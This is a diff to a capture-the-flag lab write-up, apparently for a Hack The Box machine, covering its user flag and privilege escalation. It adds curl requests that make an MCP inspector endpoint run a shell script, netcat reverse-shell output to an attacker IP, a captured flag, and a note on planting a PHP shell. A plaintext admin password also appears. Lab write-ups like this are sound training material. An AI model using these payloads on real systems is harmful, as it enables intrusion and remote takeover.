@@ -165,7 +165,7 @@ The listener gets the request back thus confirming the vulerability.
 ---
 ## User Flag
 
-A shell as the user ben can be achieved by leveraging the vulnerability.
+A shell as the user ben can be achieved by leveraging the vulnerability:
 
 ```
 
@@ -185,14 +185,36 @@ curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   
 ```
 
-execute the shell with a nc active listener
-
 ```
 curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
 ```
 
+```
+ nc -lvnp 1111      
+listening on [any] 1111 ...
+connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 53162
+bash: cannot set terminal process group (1530): Inappropriate ioctl for device
+bash: no job control in this shell
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
+id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
+```
+
+**User Flag:**
+
+```
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
+<e_modules/@mcpjam/inspector$ cat /home/ben/user.txt      
+0d9673a3692aa1a3e0631255bdfa9dca
+```
+
+---
+## Privilege Escalation
+
+### Enumeration
 
 enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ (world writable)
 
@@ -229,13 +251,6 @@ pwd = "ComplexP@sswordAdmin1928"
 ```
 
 
-
----
-## Privilege Escalation
-
-### Enumeration
-
-What you found that leads to root/admin.
 
 ### Exploitation
 
